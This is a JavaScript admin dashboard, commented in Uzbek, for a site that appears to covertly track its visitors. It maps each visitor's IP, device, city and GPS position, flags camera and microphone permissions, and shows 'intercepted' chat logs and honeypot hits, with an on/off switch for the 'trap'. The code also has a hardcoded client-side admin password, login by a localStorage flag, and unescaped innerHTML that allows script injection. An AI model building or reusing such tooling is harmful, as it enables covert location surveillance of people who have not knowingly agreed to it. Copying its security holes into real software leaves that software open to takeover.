// ==========================================
// 1. SUPABASE INTEGRATSIYASI
// ==========================================
// SHU YERGA O'ZINGIZNING SUPABASE KALITLARINGIZNI QO'YING
const supabaseUrl = 'https://zazmjpbblmhxtuvsxpkv.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inphem1qcGJibG1oeHR1dnN4cGt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI5MDAzOTgsImV4cCI6MjA4ODQ3NjM5OH0.SY4ZsJ0OJiiPGZaZP9EjEutUbe4QwzzuRE-vW-0F8J4';
const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);

// 1. TIZIM VA LOGIN LOGIKASI
// ==========================================
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth; canvas.height = window.innerHeight;
const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレゲゼデベペオォコソトノホモヨョロゴゾドボポヴッン';
const fontSize = 16; const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);
setInterval(() => {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0F0'; ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        ctx.fillText(alphabet.charAt(Math.floor(Math.random() * alphabet.length)), i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}, 30);

const ADMIN_PASSWORD = "hakker777";
window.onload = () => {
    if (localStorage.getItem('radar_admin_auth') === 'true') {
        document.getElementById('loginScreen').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
        initSystem();
    }
};

function handleLogin(e) { if (e.key === 'Enter') checkPassword(); }
function checkPassword() {
    if (document.getElementById('adminPassword').value === ADMIN_PASSWORD) {
        localStorage.setItem('radar_admin_auth', 'true');
        document.getElementById('loginScreen').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
        initSystem();
    } else {
        document.getElementById('loginError').innerText = "XATOLIK!";
        setTimeout(() => document.getElementById('loginError').innerText = "", 2000);
    }
}
function logout() { localStorage.removeItem('radar_admin_auth'); location.reload(); }

function switchTab(tabId, element) {
    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.add('hidden'));
    document.querySelectorAll('.nav-menu li').forEach(li => li.classList.remove('active'));
    document.getElementById(tabId).classList.remove('hidden');
    element.classList.add('active');
    if(tabId === 'tab-map' && map) setTimeout(() => map.invalidateSize(), 100);
    if(tabId === 'tab-chat') document.getElementById('chatBadge').innerText = '0';
    if(tabId === 'tab-msg') document.getElementById('msgBadge').innerText = '0';
}

// ==========================================
// 2. KUZATUV VA KILL-SWITCH
// ==========================================
let isTrackingActive = false;

async function fetchSettings() {
    const { data } = await supabaseClient.from('system_settings').select('tracking_active').eq('id', 1).single();
    if(data) {
        isTrackingActive = data.tracking_active;
        updateKillSwitchUI();
    }
}

async function toggleTracking() {
    isTrackingActive = !isTrackingActive;
    await supabaseClient.from('system_settings').update({ tracking_active: isTrackingActive }).eq('id', 1);
    updateKillSwitchUI();
}

function updateKillSwitchUI() {
    const btn = document.getElementById('killSwitchBtn');
    if (isTrackingActive) {
        btn.innerText = "[ QOPQON: ON ]";
        btn.className = "btn-on";
    } else {
        btn.innerText = "[ QOPQON: OFF ]";
        btn.className = "btn-off";
    }
}

// ==========================================
// 3. XARITA VA JADVAL TIZIMI
// ==========================================
let map; let markers = L.layerGroup();
let visitorMarkers = {}; // Xaritadagi nishonlarni ID bo'yicha saqlash

async function initSystem() {
    fetchSettings(); // Kill-switch holatini tortib olish
    
    // Xarita turlari
    if (!map) {
        // 1. MATRIX: Qora xakerlik xaritasi
        const darkMap = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 });
        
        // ==========================================
        // 2. SATELLITE (USTMA-UST QATLAM TEXNIKASI)
        // ==========================================
        // A) Faqat sof kosmik rasm (Tag qism)
        const pureSatellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { maxZoom: 19 });
        // B) Faqat yozuvlar va chegaralar (Shaffof ustki qism - Google API)
        const onlyLabels = L.tileLayer('http://{s}.google.com/vt/lyrs=h&x={x}&y={y}&z={z}', {
            maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']
        });
        // C) Ikkalasini bitta "Satellite" tugmasiga birlashtiramiz!
        const satelliteWithLabels = L.layerGroup([pureSatellite, onlyLabels]);

        // 3. GIBRID: Google'ning to'liq o'z xaritasi
        const hybridMap = L.tileLayer('http://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
            maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']
        });

        // Boshlang'ich holat
        map = L.map('map', { layers: [darkMap] }).setView([41.3, 69.2], 3);
        
        // Menyuga qo'shish
        L.control.layers({
            "MATRIX (QORA)": darkMap, 
            "SATELLITE (RASM + YOZUV)": satelliteWithLabels,
            "GIBRID (GOOGLE)": hybridMap
        }).addTo(map);
        
        markers.addTo(map);
    }
    fetchVisitors();
    fetchChats();
    fetchMessages();
    subscribeRealtime();
}

async function fetchVisitors() {
    const { data } = await supabaseClient.from('visitors').select('*').order('last_active', { ascending: false });
    if(data) {
        document.getElementById('logsBody').innerHTML = ''; // Jadvalni tozalab boshqatdan yozamiz
        data.forEach(log => {
            renderVisitorRow(log);
            plotOnRadar(log);
        });
    }
}

function renderVisitorRow(log) {
    const tbody = document.getElementById('logsBody');
    let row = document.getElementById(`log-row-${log.id}`);
    
    // Agar bu ID dagi qator oldin bo'lmasa, yangi yaratamiz
    if (!row) {
        row = document.createElement('tr');
        row.id = `log-row-${log.id}`;
        tbody.insertBefore(row, tbody.firstChild); 
    }

    const isOnline = log.status === 'online';
    const statusHtml = `<span class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
    
    // Ruxsat ikonkalari (Emoji yoki SVG qilsa ham bo'ladi, biz oddiy emojidan foydalanamiz)
    const gpsIcon = `<span class="perm-icon ${log.gps_allowed ? 'perm-yes' : 'perm-no'}" title="GPS">📍</span>`;
    const camIcon = `<span class="perm-icon ${log.camera_allowed ? 'perm-yes' : 'perm-no'}" title="Kamera">📷</span>`;
    const micIcon = `<span class="perm-icon ${log.mic_allowed ? 'perm-yes' : 'perm-no'}" title="Mikrofon">🎤</span>`;

    row.innerHTML = `
        <td style="color:#ff003c; font-weight:bold;">${log.ip || 'Yashirin'}</td>
        <td style="font-size:0.8rem;">${log.device || 'Noma\'lum'}<br><span style="color:#555">${log.city}</span></td>
        <td>${gpsIcon} ${camIcon} ${micIcon}</td>
        <td>${statusHtml}</td>
        <td>
            ${log.lat && log.lon ? `<button class="track-btn" onclick="focusDevice(${log.lat}, ${log.lon}, '${log.ip}')">KUZATISH 🎯</button>` : '<span style="color:#555">Koordinata yo\'q</span>'}
        </td>
    `;
}

function plotOnRadar(log) {
    if (!log.lat || !log.lon) return;

    // Eski markerni o'chirish (yangi koordinata kelsa xaritada siljishi uchun)
    if (visitorMarkers[log.id]) {
        markers.removeLayer(visitorMarkers[log.id]);
    }

    const isOnline = log.status === 'online';
    const markerColor = isOnline ? 'red' : 'gray'; // Offline bo'lsa xaritada kulrang bo'lib qoladi
    const pulseAnim = isOnline ? 'animation: pulse 1s infinite;' : '';

    const icon = L.divIcon({ 
        className: 'radar-marker', 
        html: `<div style="width:15px; height:15px; background:${markerColor}; border-radius:50%; box-shadow:0 0 10px ${markerColor}; ${pulseAnim}"></div>` 
    });
    
    const newMarker = L.marker([log.lat, log.lon], { icon: icon })
        .addTo(markers)
        .bindPopup(`<b style="color:${markerColor}">${log.ip}</b><br>${log.device}<br>Status: ${log.status.toUpperCase()}`);
    
    visitorMarkers[log.id] = newMarker;
}

window.focusDevice = function(lat, lon, ip) {
    switchTab('tab-map', document.querySelector('.nav-menu li:nth-child(1)'));
    map.flyTo([lat, lon], 16, { animate: true, duration: 2 });
}

// ==========================================
// 4. SUPABASE REALTIME (JONLI KUZATUV)
// ==========================================
function subscribeRealtime() {
    supabaseClient.channel('custom-all-channel')
        // Tizim sozlamalari (Boshqa joydan yoqib o'chirilsa)
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'system_settings' }, payload => {
            isTrackingActive = payload.new.tracking_active;
            updateKillSwitchUI();
        })
        // Yangi nishon tushganda
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'visitors' }, payload => {
            renderVisitorRow(payload.new); plotOnRadar(payload.new);
        })
        // Eski nishon harakatlanganda yoki Offline/Online bo'lganda (HEARTBEAT)
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'visitors' }, payload => {
            renderVisitorRow(payload.new); plotOnRadar(payload.new);
        })
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'chat_logs' }, payload => {
            addChatToUI(payload.new);
            let badge = document.getElementById('chatBadge'); badge.innerText = parseInt(badge.innerText) + 1;
        })
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'contact_messages' }, payload => {
            addMessageToUI(payload.new);
            let badge = document.getElementById('msgBadge'); badge.innerText = parseInt(badge.innerText) + 1;
        })
        .subscribe();
}

// 5. CHAT VA XABARLAR YORDAMCHI FUNKSIYALARI
async function fetchChats() {
    const { data } = await supabaseClient.from('chat_logs').select('*').order('created_at', { ascending: true });
    if(data) data.forEach(addChatToUI);
}
function addChatToUI(chat) {
    const container = document.getElementById('chatContainer');
    let group = document.getElementById('chat-group-' + chat.ip);
    if (!group) {
        group = document.createElement('div'); group.className = 'chat-group'; group.id = 'chat-group-' + chat.ip;
        group.innerHTML = `<div class="chat-ip">Intercepted IP: ${chat.ip}</div><div class="chat-messages"></div>`;
        container.insertBefore(group, container.firstChild);
    }
    const msgBox = group.querySelector('.chat-messages');
    const bubble = document.createElement('div');
    bubble.className = `msg-bubble ${chat.sender === 'user' ? 'user-txt' : 'ai-txt'}`;
    bubble.innerText = chat.message;
    msgBox.appendChild(bubble);
}

async function fetchMessages() {
    const { data } = await supabaseClient.from('contact_messages').select('*').order('created_at', { ascending: false });
    if(data) data.forEach(addMessageToUI);
}
function addMessageToUI(msg) {
    const container = document.getElementById('msgContainer');
    const card = document.createElement('div'); card.className = 'msg-card';
    card.innerHTML = `<div class="msg-title">Mavzu: ${msg.subject}</div><div class="msg-sender">Kimdan: ${msg.name} (${msg.email}) | Vaqt: ${new Date(msg.created_at).toLocaleTimeString()}</div><div class="msg-body">${msg.message}</div>`;
    card.onclick = () => card.classList.toggle('open');
    container.insertBefore(card, container.firstChild);
}

async function fetchHoneypotLogs() {
    const { data } = await supabaseClient.from('honeypot_logs').select('*').order('created_at', { ascending: false });
    if(data) data.forEach(addHoneypotToUI);
}

function addHoneypotToUI(log) {
    const tbody = document.getElementById('honeypotBody');
    const row = document.createElement('tr');
    row.style.background = "rgba(255, 0, 60, 0.1)"; // Hackerlarni qizilroq ko'rsatish
    row.innerHTML = `
        <td>${new Date(log.created_at).toLocaleTimeString()}</td>
        <td style="color:#ff003c; font-weight:bold;">${log.visitor_ip}</td>
        <td style="color:#ffcc00;">${log.trap_name}</td>
        <td style="font-size:0.7rem; color:#aaa;">${log.user_agent}</td>
    `;
    tbody.insertBefore(row, tbody.firstChild);
}

// subscribeRealtime() funksiyasiga shuni qo'shing:
// .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'honeypot_logs' }, payload => {
//     addHoneypotToUI(payload.new);
//     let badge = document.getElementById('honeypotBadge'); badge.innerText = parseInt(badge.innerText) + 1;
// })
